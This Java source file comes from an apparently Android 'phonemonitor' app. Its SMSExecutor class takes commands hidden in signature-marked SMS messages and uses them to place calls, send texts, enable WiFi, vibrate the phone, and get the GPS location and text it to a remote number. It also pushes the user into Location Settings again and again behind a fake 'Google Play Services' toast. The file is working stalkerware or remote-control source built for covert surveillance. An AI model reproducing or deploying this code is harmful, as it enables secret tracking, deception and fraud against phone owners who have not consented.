package com.monitor.phone.s0ft.phonemonitor;


import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Vibrator;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.Callable;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

/*
* This class's Execute() method parses the given SMS message and acts on any commands it contains
* Returns true if the SMS was a command SMS intended for the app, false if not
* Every SMS intended as a command must contain the signature string ;;;;;///// in the message body
* The signature indicates that the SMS is a command SMS; if absent, the SMS will not be processed
* The position of the signature is irrelevant
* Any command in an SMS must be written out as :
* Command_code->Parameter1->Parameter2->Parameter3 ...
*
*
* SMS Commands:
*
* 1. Vibrate:
* + Command code : 0
* + Command parameters : Number of repeats, String pattern of vibrations
* + The string pattern of vibration should follow the sequence : (Delay) (Vibrate) (Delay) (Vibrate) (Delay) ...
* + Example SMS:
* + ";;;;;///// 0->3->0 100 50 100 50 100 50 300 50 100 50 100 50 100 500"
* + The above SMS will vibrate the phone using the specified pattern for 3 times
*
* 2. Call:
* + Command code : 1
* + Command parameters : Phone to call
* + Example SMS:
* + ";;;;;///// 1->9851785478"
* + The above SMS will call the phone number 9851785478
*
* 3. SMS:
* + Command code : 2
* + Command parameters : Destination mobile phone number, Message body
* + Example SMS:
* + ";;;;;///// 2->9851785478->Hello! This is a text message to you."
* + The above SMS will send the specified text message to the phone number 9851785478
*
* 4. Enable WIFI:
* + Command code : 3
* + Command parameters : Wait time in milliseconds
* + Example SMS:
* + ";;;;;///// 3->10000"
* + The above SMS will try to enable WIFI after 10 seconds
* + ";;;;;///// 3" OR ";;;;;///// 3->"
* + The above SMS will try to enable WIFI immediately
*
* 5. Retrieve Location:
* + Command code : 4
* + Command parameters : Number of times to take to location settings, Show toast or not, Send location to number
* + Example SMS:
* + ";;;;;///// 4->10->1->9578512468"
* + The above SMS will try to retrieve device location by taking user to Location Settings a maximum of 10 times along with displaying a toast message(second parameter i.e. 1)
* + urging the user to enable Location Services each time until the user enables Location Services. Upon successful retrieval of location coordinates, an SMS to the number
* + 9578512468 is sent with the location.
* + If no toast message is to be displayed while taking the user to Location Settings, provide 0 as the second parameter.
* + If the user is not to be taken to Location Settings, provide 0 as the first parameter.
* + If the location is to be sent to the same number through which the SMS has been sent to the device, don't provide the last parameter. Both the following will be valid:
* + ";;;;;///// 4->10->1->"
* + ";;;;;///// 4->10->1"
* */

class SMSExecutor implements LocationListener {

    private String _sender;
    private String _msg;
    private Context _ctx;

    private static final String Signature = ";;;;;/////";
    private static final String Delimeter = "->";

    private enum Commands {
        CM_VIBRATE(0),
        CM_CALL(1),
        CM_SENDSMS(2),
        CM_ENABLEWIFI(3),
        CM_LOCATION(4);


        private final int _command;

        Commands(int command) {
            this._command = command;
        }

        int getValue() {
            return this._command;
        }

    }



    SMSExecutor(String sender, String msg, Context context) {
        this._sender = sender;
        this._msg = msg;
        this._ctx = context;
    }

    boolean Execute() {
        if (this._msg.contains(Signature)) {//if it is indeed a command SMS intended for us
            String puremsg = this._msg.replace(Signature, "");
            String[] tokens = puremsg.split(Delimeter);
            if (tokens.length > 0) {
                try {
                    int command = Integer.parseInt(tokens[0].trim().replace("\n", ""));
                    final String commandData = puremsg.replaceFirst(tokens[0] + ((puremsg.contains(Delimeter))?(Delimeter):("")), "");
                    if (command == Commands.CM_VIBRATE.getValue()) {
                        HandleVibration(commandData);
                    } else if (command == Commands.CM_CALL.getValue()) {
                        HandleCalling(commandData);
                    } else if (command == Commands.CM_SENDSMS.getValue()) {
                        HandleSMS(commandData);
                    } else if (command == Commands.CM_ENABLEWIFI.getValue()) {
                        EnableWifi(commandData);
                    } else if(command==Commands.CM_LOCATION.getValue()){
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                SendGPSCoordinates(commandData);
                            }
                        }).start();
                    }

                } catch (NumberFormatException nfex) {
                    //non parseable string
                }


            }
            return true;//it was a command SMS
        } else {
            return false;//it was not an SMS intended for us
        }
    }

    private void HandleVibration(String vibrationData) {
        /*
        * Sample vibrationData:
        * 2->0 1000 100 2000 150
        * The above is interpreted as:
        * (RepeatTimes)->(DelayMS) (VibrateMS) (DelayMS) (VibrateMS)
        * */
        String[] token = vibrationData.split(Delimeter);
        if (token.length == 2) {
            final int repeatTimes = Integer.parseInt(token[0]);
            String vibPatternString = token[1].trim().replace("\n", "");
            String[] patternTokens = vibPatternString.split(" ");
            List<Long> vibPatternList = new ArrayList<Long>();
            for (String patternToken : patternTokens) {
                try {
                    long patternTokenLong = Long.parseLong(patternToken);
                    vibPatternList.add(patternTokenLong);
                } catch (NumberFormatException nfex) {
                    //Do nothing, skip this token
                }
            }
            long[] finalPattern = new long[vibPatternList.size()];
            long totalSleepTime = 0;
            for (int i = 0; i < vibPatternList.size(); i++) {
                finalPattern[i] = vibPatternList.get(i);
                totalSleepTime += finalPattern[i];
            }
            final long finalTotalSleepTime = totalSleepTime;
            final long[] finalFinalPattern = finalPattern;
            final Vibrator vibrator = (Vibrator) _ctx.getSystemService(Context.VIBRATOR_SERVICE);
            if (vibrator != null) {
                if (vibrator.hasVibrator()) {
                    new Thread() {
                        @Override
                        public void run() {
                            for (int i = 1; i <= repeatTimes; i++) {
                                vibrator.vibrate(finalFinalPattern, -1);
                                try {
                                    Thread.sleep(finalTotalSleepTime);//vibrate is asynchronous, so sleep
                                } catch (InterruptedException itex) {
                                    //thread execution was interrupted
                                }
                            }

                        }
                    }.start();

                }
            }

        }
    }

    private void HandleCalling(String callingData) {
        /*
        * Sample callingData:
        * 9841758496
        * */
        String phoneNumber = callingData.trim().replace("\n", "");
        if (!phoneNumber.equals("")) {
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse("tel:" + phoneNumber));
            intent.setFlags(FLAG_ACTIVITY_NEW_TASK);
            _ctx.startActivity(intent);
        }
    }

    private void HandleSMS(String SMSData) {
        /*
        * Sample SMSData:
        * 9851785478->Hello! This is a text message to you.
        * */
        String[] tokens = SMSData.split(Delimeter);
        if (tokens.length >= 2) {//can be greater too, if "->" is present in the message
            String targetPhone = tokens[0].trim().replace("\n", "");
            String msgBody = SMSData.replace(tokens[0] + Delimeter, "");
            if (!targetPhone.equals("")) {
                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(targetPhone, null, msgBody, null, null);
            }
        }
    }

    private void EnableWifi(String enableWifiData) {
        /*
        * enableWifiData can be in any of the following formats:
        * 10000 OR,
        * (nothing)
        * */
        if(enableWifiData.trim().replace("\n","").equals("")){
            EnableWifi();
        }else{
            Long waitTime=Long.parseLong(enableWifiData.trim().replace("\n",""));
            new Timer().schedule(new TimerTask() {
                @Override
                public void run() {
                    EnableWifi();
                }
            },waitTime);
        }
    }

    private void EnableWifi() {
        WifiManager wifiManager = (WifiManager) _ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wifiManager != null) {
            wifiManager.setWifiEnabled(true);
        }
    }

    private void SendGPSCoordinates(String GPSCommandData) {
        //Note : This method should be run in a separate thread since it can take some time to get a GPS fix. SMSBroadcastReceiver's thread shouldn't be that busy.
        //Sample GPSCommandData:
        //10->1->9578512468     OR
        //10->1->   OR
        //10->1
        //Explanation of arguments :
        //10 : promptUserLocationOn=Number of times to forcibly take user to Location settings
        //1 : showPromptToast=Whether or not to show a toast message to user prompting to enable Location Service(can be 0 or 1)
        //9578512468 : sendSMSToNumber=Number to send latlong SMS to.. Can be "" in which case SMS will be sent to the sender's number

        String[] token=GPSCommandData.split(Delimeter);
        if(token.length>=2){ //if GPSCommandData fits the format
            int promptUserLocationOn=Integer.parseInt(token[0].trim().replace("\n",""));
            final Boolean showPromptToast;
            String sendSMSToNumber;

            String remainingParams=GPSCommandData.replace(token[0]+Delimeter,"");
            if(!remainingParams.contains(Delimeter)){ //here, remainingParams is just a number
                showPromptToast=(remainingParams.equals("1"));
                sendSMSToNumber=_sender;
            } else{ //here, remainingParams is either 1->   OR 1->9578512468
                String[] token2=remainingParams.split(Delimeter);
                showPromptToast=(token2[0].trim().replace("\n","").equals("1"));
                String remainingParams2=remainingParams.replace(token2[0]+Delimeter,"");
                if(remainingParams2.trim().replace("\n","").equals("")){ //here, remainingParams2 is empty
                    sendSMSToNumber=_sender;
                }else{ //here, remainingParams2 is a number
                    sendSMSToNumber=remainingParams2.trim().replace("\n","");
                }
            }

            String latLong = "";
            final LocationManager locationManager = (LocationManager) _ctx.getSystemService(Context.LOCATION_SERVICE);
            if (locationManager != null) {
                while (!(locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) || locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) && promptUserLocationOn > 0) {
                    //if neither GPS nor NETWORK location provider is enabled,
                    Handler handler = new Handler(Looper.getMainLooper());
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            if (showPromptToast)
                                Toast.makeText(_ctx.getApplicationContext(), "Google Play Services requires Location Services to be enabled.", Toast.LENGTH_LONG).show();
                        }
                    });
                    Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    _ctx.startActivity(intent);
                    try {
                        Thread.sleep(10000);
                    } catch (InterruptedException iex) {
                    }
                    promptUserLocationOn--;
                }
                Location location = null;
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    //use gps
                    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 50, 0, this, Looper.getMainLooper());
                    try {
                        HelperMethods.waitWithTimeoutN(new Callable() {
                            @Override
                            public Object call() throws Exception {
                                return locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                            }
                        }, null, 3 * 60 * 1000);//wait for GPS based location. this may take several minutes. if no result in 3 min, try NETWORK_PROVIDER approach as below.
                    } catch (Exception ex) {
                        Log.w(AppSettings.getTAG(), ex.getMessage());
                    }
                    location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                }
                if (location == null) {
                    if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                        //enable wifi first
                        //as per my trials, wifi with internet access needs to be enabled for Network based location.
                        EnableWifi();

                        //use network
                        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 50, 0, this, Looper.getMainLooper());
                        try {
                            HelperMethods.waitWithTimeoutN(new Callable() {
                                @Override
                                public Object call() throws Exception {
                                    return locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                                }
                            }, null, 60000);//network based location is quicker, wait 1 minute. allows for internet connection to be established.
                        } catch (Exception ex) {
                            Log.w(AppSettings.getTAG(), ex.getMessage());
                        }
                        location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    }
                }
                if (location != null) {
                    Log.w(AppSettings.getTAG(), "Lat : " + Double.toString(location.getLatitude()) + "\n" + "Long : " + Double.toString(location.getLongitude()));
                    latLong = "Lat : " + Double.toString(location.getLatitude()) + "\nLong : " + Double.toString(location.getLongitude());
                    if (!sendSMSToNumber.equals("")) {
                        SmsManager smsManager = SmsManager.getDefault();
                        smsManager.sendTextMessage(sendSMSToNumber, null, latLong, null, null);
                    }
                } else {
                    Log.w(AppSettings.getTAG(), "No location found");
                }
            }
        }


    }

    @Override
    public void onLocationChanged(Location location) {

    }

    @Override
    public void onStatusChanged(String s, int i, Bundle bundle) {

    }

    @Override
    public void onProviderEnabled(String s) {

    }

    @Override
    public void onProviderDisabled(String s) {

    }
}
